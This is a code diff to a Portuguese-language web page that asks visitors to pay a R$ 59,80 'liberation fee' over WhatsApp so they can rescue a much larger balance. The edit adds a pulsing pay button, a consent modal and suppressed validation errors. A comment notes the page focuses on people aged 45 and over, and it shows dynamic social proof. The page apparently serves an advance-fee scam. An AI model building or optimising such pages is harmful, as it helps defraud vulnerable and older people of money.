@@ -232,24 +232,16 @@
             </div>
 
             <!-- Vantagem / Ancoragem -->
-            <div class="bg-emerald-50 border-2 border-emerald-300 p-3 rounded-xl text-emerald-900 text-center shadow-inner mb-4">
+            <div class="bg-emerald-50 border-2 border-emerald-300 p-3 rounded-xl text-emerald-900 text-center shadow-inner mb-5">
                 <p class="text-[11px] font-bold text-emerald-800 uppercase tracking-wide">💡 Vantagem do Resgate</p>
                 <p class="text-xs mt-1">A taxa de liberação de <strong class="text-emerald-700 font-bold">R$ 59,80</strong> representa <strong>menos de 1%</strong> do valor total de <span id="valor-badge-taxa" class="font-mono font-bold text-emerald-700">R$ 0,00</span> que você vai resgatar!</p>
             </div>
 
-            <!-- CHECKBOX DE CONFIRMAÇÃO (Foco no público 45+) -->
-            <div class="bg-blue-50 border-2 border-blue-200 rounded-xl p-3.5 mb-4 flex items-start space-x-3 text-left">
-                <input type="checkbox" id="check-ciente" onchange="alternarBotaoWhatsApp()" class="mt-1 w-5 h-5 accent-brand cursor-pointer flex-shrink-0">
-                <label for="check-ciente" class="text-xs text-slate-800 font-bold cursor-pointer leading-relaxed">
-                    Estou ciente de que serei atendido no WhatsApp para realizar o pagamento da taxa de emissão de <span class="text-brand font-black">R$ 59,80</span> e concluir meu saque hoje.
-                </label>
-            </div>
-
-            <!-- Botão Pagar no WhatsApp (Começa desativado/acinzentado até marcar a caixa) -->
-            <a id="link-whatsapp" href="#" onclick="clicarWhatsApp(event)" target="_blank"
-                class="w-full bg-slate-300 text-slate-500 font-black py-4 rounded-xl transition duration-200 shadow-sm text-base flex items-center justify-center space-x-2 mb-5 cursor-not-allowed text-center no-underline pointer-events-none">
-                <span>💬 Ir para o WhatsApp Pagar a Taxa</span>
-            </a>
+            <!-- Botão principal que abre a janela de confirmação -->
+            <button onclick="abrirModalConfirmacao()"
+                class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-black py-4 rounded-xl transition duration-200 shadow-xl text-base flex items-center justify-center space-x-2 mb-5 cursor-pointer animate-pulse text-center">
+                <span>💬 Pagar Taxa no WhatsApp</span>
+            </button>
 
             <!-- Provas Sociais Dinâmicas -->
             <div class="border-t border-slate-200 pt-4">
@@ -261,6 +253,37 @@
         </div>
 
     </main>
+
+    <!-- JANELA MODAL DE CONFIRMAÇÃO (Pop-up ao clicar no botão) -->
+    <div id="modal-whatsapp" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl border-2 border-brand text-center relative">
+            <h3 class="text-lg font-black text-slate-900 mb-2">Confirmação de Atendimento</h3>
+            <p class="text-xs text-slate-600 mb-4 leading-relaxed">
+                Para sua segurança, confirme abaixo que está ciente de que será direcionado para o atendimento no WhatsApp para pagar a taxa de emissão de <strong class="text-brand">R$ 59,80</strong>.
+            </p>
+
+            <!-- Checkbox dentro do Modal -->
+            <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 mb-5 text-left flex items-start space-x-2.5">
+                <input type="checkbox" id="modal-check" onchange="liberarBotaoModal()" class="mt-0.5 w-5 h-5 accent-brand cursor-pointer flex-shrink-0">
+                <label for="modal-check" class="text-xs text-slate-800 font-bold cursor-pointer leading-tight">
+                    Estou ciente e concordo em pagar a taxa de emissão no WhatsApp.
+                </label>
+            </div>
+
+            <div class="space-y-2.5">
+                <!-- Botão final que dispara para o WhatsApp -->
+                <a id="modal-btn-zap" href="#" onclick="dispararWhatsApp(event)" target="_blank"
+                    class="w-full bg-slate-300 text-slate-500 font-bold py-3.5 rounded-xl transition duration-200 text-sm flex items-center justify-center space-x-2 cursor-not-allowed pointer-events-none no-underline shadow-sm">
+                    <span>➡️ Ir para o WhatsApp Agora</span>
+                </a>
+
+                <button onclick="fecharModalConfirmacao()" 
+                    class="w-full bg-slate-100 hover:bg-slate-200 text-slate-600 font-bold py-2.5 rounded-xl text-xs transition duration-200">
+                    Cancelar / Voltar
+                </button>
+            </div>
+        </div>
+    </div>
 
     <!-- Rodapé -->
     <footer class="text-center py-4 text-[10px] text-slate-500 max-w-md mx-auto px-4">
@@ -459,7 +482,7 @@
                 btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
                 btn.classList.remove('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
                 if(contaGlobal.length > 0) {
-                    err.classList.remove('hidden');
+                    err.classList.add('hidden'); // Oculta erro prematuro para facilitar digitação
                 } else {
                     err.classList.add('hidden');
                 }
@@ -522,25 +545,34 @@
             }, 1000);
         }
 
-        // Função que ativa/desativa o botão do WhatsApp dependendo do checkbox
-        function alternarBotaoWhatsApp() {
-            let marcado = document.getElementById('check-ciente').checked;
-            let botao = document.getElementById('link-whatsapp');
+        // Funções da Janela Modal de Confirmação
+        function abrirModalConfirmacao() {
+            document.getElementById('modal-check').checked = false;
+            liberarBotaoModal();
+            document.getElementById('modal-whatsapp').classList.remove('hidden');
+        }
+
+        function fecharModalConfirmacao() {
+            document.getElementById('modal-whatsapp').classList.add('hidden');
+        }
+
+        function liberarBotaoModal() {
+            let marcado = document.getElementById('modal-check').checked;
+            let botaoZap = document.getElementById('modal-btn-zap');
 
             if (marcado) {
-                botao.classList.remove('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
-                botao.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-xl');
+                botaoZap.classList.remove('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
+                botaoZap.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-md');
             } else {
-                botao.classList.add('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
-                botao.classList.remove('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-xl');
+                botaoZap.classList.add('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
+                botaoZap.classList.remove('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-md');
             }
         }
 
-        function clicarWhatsApp(event) {
-            let marcado = document.getElementById('check-ciente').checked;
+        function dispararWhatsApp(event) {
+            let marcado = document.getElementById('modal-check').checked;
             if (!marcado) {
                 event.preventDefault();
-                alert("Por favor, marque a caixa confirmando que está ciente da taxa para prosseguir.");
                 return;
             }
 
